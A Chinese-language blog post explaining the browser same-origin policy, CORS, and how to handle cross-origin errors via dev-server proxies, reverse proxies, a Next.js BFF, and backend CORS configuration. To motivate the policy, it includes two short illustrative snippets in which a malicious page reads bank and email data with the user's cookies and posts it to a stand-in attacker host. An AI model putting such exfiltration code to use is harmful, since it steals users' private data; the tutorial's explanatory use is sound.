---
title: 本地明明好好的，怎么一上线就跨域了？把同源策略、前后端分工和 CORS 一次讲明白
slug: frontend-cors-explained-with-nextjs-react-vue-node
image: https://img.huzhihui.com/uploads/2026/04/frontend-cors-explained-with-nextjs-react-vue-node-banner_dhxrtnqrgs2o.png
publishedAt: 2026-04-18T15:02
summary: 很多跨域问题，不是代码上线才突然坏掉，而是你本地开发时被 dev server 和代理暂时“护住了”。真想把这事搞明白，第一步不是搜 React、Vue、Next.js 跨域怎么配，而是先用大白话把浏览器同源策略想通：它到底在防什么、没有它会怎样、前后端各自该怎么处理。
keywords:
  - 前端跨域
  - 同源策略
  - CORS
  - Spring Boot CORS
  - FastAPI CORS
tags:
  - 前端
  - 跨域
  - 同源策略
  - CORS
  - Spring Boot
  - FastAPI
---

![本地明明好好的，怎么一上线就跨域了？把同源策略、前后端分工和 CORS 一次讲明白头图](https://img.huzhihui.com/uploads/2026/04/frontend-cors-explained-with-nextjs-react-vue-node-banner_dhxrtnqrgs2o.png)
很多跨域问题，最烦的不是报错本身。

而是它特别会骗人。

本地开发时，页面能跑，请求能发，联调能过。你会天然觉得这事已经没问题了。结果一打包、一上线、域名一换，浏览器控制台直接来一句：

```txt
Access to fetch at 'https://api.example.com/user' from origin 'https://www.example.com'
has been blocked by CORS policy
```

然后很多人第一反应就是去搜：

- `React 跨域怎么解决`
- `Vue 跨域怎么解决`
- `Next.js 跨域怎么解决`

**跨域首先不是框架问题，先是浏览器规则问题。**

如果你没先把浏览器的同源策略想明白，后面不管是配 `CORS`、开代理、上网关，还是用 `Next.js` 做 BFF，都会像在背答案，不像真的懂。

## 用大白话把同源策略讲明白

同源策略这个词听起来很硬，其实翻成人话就一句：

**浏览器允许你同时打开很多网站，但不允许 A 网站里的 JavaScript，默认去偷看 B 网站里的数据。**

这里的 A 网站和 B 网站，浏览器不是凭感觉分的，它看的是 3 个东西：

- 协议
- 域名
- 端口

这 3 个都一样，才算同源。

比如：

- `http://localhost:5173` 和 `http://localhost:3001`
- `http://api.example.com` 和 `https://api.example.com`
- `https://www.example.com` 和 `https://api.example.com`

这几组都不是同源。

Chrome 团队在 `web.dev` 的官方文章里对 same-origin policy 和 origin 的解释其实很清楚，我建议直接看这两篇：

- [Same-origin policy - web.dev](https://web.dev/articles/same-origin-policy)
- [Same-site and same-origin - web.dev](https://web.dev/articles/same-site-same-origin)

如果只记一句，我希望你记的是这个版本：

**同源策略管的不是“请求能不能发”，而是“当前页面脚本能不能读另一个源的内容”。**

所以很多跨域报错最容易把人带偏的一点就是：

你以为请求没发出去。
其实很多时候请求已经到了，浏览器只是最后不让你读。

## 浏览器为什么非要搞这条规则

因为浏览器不是只服务一个网站。

同一个浏览器里，用户可能同时登录了：

- 银行后台
- 邮箱
- 公司管理系统
- 云服务控制台

这时候如果浏览器没有同源策略，恶意网站就能很离谱。

比如用户打开了：

```txt
https://evil.example
```

这个页面里的脚本理论上就可以这样搞：

```ts
const bankInfo = await fetch('https://bank.example/api/account', {
  credentials: 'include',
}).then((res) => res.text());

await fetch('https://evil.example/collect', {
  method: 'POST',
  body: bankInfo,
});
```

或者去偷邮箱内容：

```ts
const inboxHtml = await fetch('https://mail.example/inbox', {
  credentials: 'include',
}).then((res) => res.text());

await fetch('https://evil.example/leak', {
  method: 'POST',
  body: inboxHtml,
});
```

如果浏览器允许这种事，那今天的 Web 根本没法安全地跑。

你登录银行也好，登录公司后台也好，等于都在替别的网站准备数据。

而且这还不只是公网网站的问题。

Chrome 和 MDN 这类资料都反复提过一个风险点：内网。因为用户的浏览器本来就能访问公司内网、家庭路由器、本地设备。如果恶意页面可以随便跨源读取：

- `http://intranet.local`
- `http://jira.corp.internal`
- `http://192.168.1.1`

那浏览器就会变成攻击者探测和读取内网的工具。

所以同源策略不是浏览器故意刁难前端。

它本质上是在干一件很底层、也很必要的事：

**把不同网站之间的边界先立住。**

## 如果没有同源策略，会发生什么

这个问题其实已经可以直接回答了。

没有同源策略，就意味着：

- 一个网站能随便读另一个网站的数据
- 恶意站点能借用户登录态去读银行、邮箱、后台
- 公网页面能顺着用户浏览器去探测内网资源
- 浏览器里“同时登录多个网站”这件事会天然变得危险

也就是说，同源策略不是“锦上添花”的规则。

它是 Web 安全模型里最基础的一条底线。

先把这个底线想明白，后面再看跨域，你就不会觉得浏览器在无理取闹了。

## 那跨域报错本质上是什么

到了这里，再看跨域就会顺很多。

所谓跨域，本质上就是：

**浏览器发现当前页面脚本想跨源读取资源，于是开始检查：对方有没有明确授权你读。**

这个授权机制，就是 `CORS`。

所以 `CORS` 不是另一套独立安全体系。
它是同源策略下面的一个“受控放行机制”。

浏览器大概会这么判断：

1. 这是不是跨源请求？
2. 如果是跨源，请求够不够简单？
3. 如果不简单，要不要先发 `OPTIONS` 预检？
4. 服务端回来的 `Access-Control-Allow-*` 够不够让我放行？
5. 如果不够，响应就算到了，我也不给页面脚本读。

这也顺手解释了为什么：

- `curl` 能通
- `Postman` 能通
- 后端日志也看到请求了

浏览器却还在报跨域。

因为 `curl`、`Postman` 不跑在浏览器安全模型里，它们不会替浏览器执行同源策略和 `CORS` 这套限制。

## 前后端是怎么把自己搞成跨域的

很多跨域问题，说穿了都是前后端部署关系变了。

最常见的场景就是本地开发：

- 前端：`http://localhost:5173`
- 后端：`http://localhost:8080`

前端代码里如果直接写：

```ts
await fetch('http://localhost:8080/api/user');
```

那浏览器一看就知道：

- 当前页面 origin 是 `http://localhost:5173`
- 目标接口 origin 是 `http://localhost:8080`

端口不一样。
这就已经跨源了。

正式环境也一样。

比如：

- 页面：`https://www.example.com`
- API：`https://api.example.com`

域名不一样。
还是跨源。

再比如：

- 页面：`http://www.example.com`
- API：`https://www.example.com`

协议不一样。
照样跨源。

所以前后端导致跨域，不是因为谁写错了框架。

本质上就是：

**前端页面所在的 origin，和后端接口所在的 origin，不一样。**

## 前端能怎么解决跨域

这里先说一个容易让人误会的事实：

**前端没法靠自己“解除浏览器规则”。**

浏览器规则是浏览器定的，不是你在 `fetch` 里多写两行就能推翻的。

前端侧真正能做的，主要有 3 类。

### 1. 本地开发时，用 dev server 代理

这也是为什么很多人本地感觉不到跨域。

比如 `Vite`：

```ts
import { defineConfig } from 'vite';

export default defineConfig({
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
      },
    },
  },
});
```

前端代码改成：

```ts
await fetch('/api/user');
```

这时候浏览器看到的是：

```txt
http://localhost:5173 -> http://localhost:5173/api/user
```

浏览器以为这是同源请求。

真正从 `5173` 转发到 `8080`，是本地开发服务器在做。

也就是说：

**本地不是没有跨域，而是工程化帮你先挡住了。**

### 2. 生产上把入口收成同源

这是更稳的工程化做法。

比如对外只暴露：

- `https://www.example.com`
- `https://www.example.com/api/*`

后面再由 `Nginx`、网关或反向代理转发到真实后端。

```nginx
server {
  listen 443 ssl;
  server_name www.example.com;

  location / {
    root /srv/www/app;
    try_files $uri /index.html;
  }

  location /api/ {
    proxy_pass http://127.0.0.1:8080/;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }
}
```

前端代码还是：

```ts
await fetch('/api/user');
```

浏览器始终只看见一个 origin。

这其实和本地 `Vite proxy` 是一类思路：

- 本地是 dev server 帮你转
- 线上是网关 / 反向代理帮你转

### 3. 用 BFF，把浏览器层的跨源读取搬到服务端

这类方案在 `Next.js`、Node 中间层里很常见。

例如 `Next.js` Route Handler：

```ts
// app/api/user/route.ts
export async function GET() {
  const upstream = await fetch('https://api.example.com/user', {
    headers: {
      Authorization: `Bearer ${process.env.API_TOKEN}`,
    },
    cache: 'no-store',
  });

  const data = await upstream.json();

  return Response.json(data);
}
```

前端页面只请求：

```ts
await fetch('/api/user');
```

对浏览器来说，这还是同源。
真正跨到上游接口的，是服务端。

所以前端侧解法的核心，不是“让浏览器别按规则办事”。

而是：

- 要么开发时用代理把它藏起来
- 要么生产上用同源入口把它收起来
- 要么把跨源读取搬到服务端

## 后端能怎么解决跨域

如果你的业务就是要让浏览器直接跨源访问 API，那最终拍板的还是后端。

后端要做的事很明确：

- 明确允许哪些 `Origin`
- 明确允许哪些方法
- 明确允许哪些请求头
- 处理好 `OPTIONS` 预检
- 如果要带 cookie，就别偷懒写 `*`

这里我直接给几个经典后端框架的例子。

### Spring Boot / Java

Spring 官方有两种常见路子：单接口 `@CrossOrigin`，或者全局 `WebMvcConfigurer`。

简单一点可以这样：

```java
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class UserController {

    @CrossOrigin(origins = "https://www.example.com")
    @GetMapping("/api/user")
    public String user() {
        return "huzhihui";
    }
}
```

全局配置更常见：

```java
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
                .allowedOrigins("https://www.example.com")
                .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
                .allowedHeaders("*")
                .allowCredentials(true);
    }
}
```

官方参考：

- [Spring Guide: REST service CORS](https://spring.io/guides/gs/rest-service-cors)
- [Spring Framework Reference: CORS](https://docs.spring.io/spring-framework/reference/web/webmvc-cors.html)

### Gin / Go

Go 这边最常见的就是 `gin-contrib/cors`：

```go
package main

import (
  "time"

  "github.com/gin-contrib/cors"
  "github.com/gin-gonic/gin"
)

func main() {
  r := gin.Default()

  r.Use(cors.New(cors.Config{
    AllowOrigins:     []string{"https://www.example.com"},
    AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
    AllowHeaders:     []string{"Origin", "Content-Type", "Authorization"},
    AllowCredentials: true,
    MaxAge:           12 * time.Hour,
  }))

  r.GET("/api/user", func(c *gin.Context) {
    c.JSON(200, gin.H{"name": "huzhihui"})
  })

  r.Run(":8080")
}
```

官方参考：

- [gin-contrib/cors](https://github.com/gin-contrib/cors)

### FastAPI / Python

FastAPI 官方推荐 `CORSMiddleware`：

```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

origins = [
    "https://www.example.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/api/user")
def read_user():
    return {"name": "huzhihui"}
```

官方参考：

- [FastAPI: CORS](https://fastapi.tiangolo.com/tutorial/cors/)

## 为什么很多人一遇到跨域，方向就先错了

因为大家太容易把“跨域报错发生在前端”误解成“这一定是前端框架的问题”。

但你现在再回头看就会发现：

- `React` 不会决定同不同源
- `Vue` 不会决定同不同源
- `axios` 也不会决定同不同源

只要请求是浏览器发的，最后面对的还是浏览器规则。

所以一上来就搜：

- `React 跨域怎么解决`
- `Vue 跨域怎么解决`
- `Next.js 跨域怎么解决`

往往会让你把注意力放错地方。

更好的顺序其实是：

1. 先确认是不是同源策略在拦
2. 再确认这次请求该不该由浏览器直接发
3. 如果该直连，就让后端正确配 `CORS`
4. 如果不该直连，就从工程化上把入口收成同源

## 我的观点

我现在对这件事的观点很明确：

**跨域问题，表面上是前端报错，底层上是浏览器规则和工程化边界没一起想清楚。**

本地开发很多时候没问题，不是因为跨域突然不存在了。
而是本地工程化偷偷帮你垫了一层 dev server。

正式环境一上线，真实域名、真实协议、真实端口关系全露出来，浏览器才开始按它本来的规则办事。

所以跨域这事，真正该先学的不是某个框架配置项。

而是两句话：

第一，浏览器为什么要立同源策略这条边界。

第二，这次请求到底该不该让浏览器直接跨这条边界。

这两句想明白了，后面的 `CORS`、代理、网关、BFF、Spring Boot、Gin、FastAPI，其实都只是不同位置上的实现手段。

## 参考资料

- [Same-origin policy - web.dev](https://web.dev/articles/same-origin-policy)
- [Same-site and same-origin - web.dev](https://web.dev/articles/same-site-same-origin)
- [MDN: Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [MDN: Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
- [Spring Guide: REST service CORS](https://spring.io/guides/gs/rest-service-cors)
- [Spring Framework Reference: CORS](https://docs.spring.io/spring-framework/reference/web/webmvc-cors.html)
- [gin-contrib/cors](https://github.com/gin-contrib/cors)
- [FastAPI: CORS](https://fastapi.tiangolo.com/tutorial/cors/)
- [Next.js: Backend for Frontend](https://nextjs.org/docs/app/guides/backend-for-frontend)
- [Next.js: Route Handlers](https://nextjs.org/docs/app/getting-started/route-handlers)
- [Vite: server.proxy](https://vite.dev/config/server-options#server-proxy)
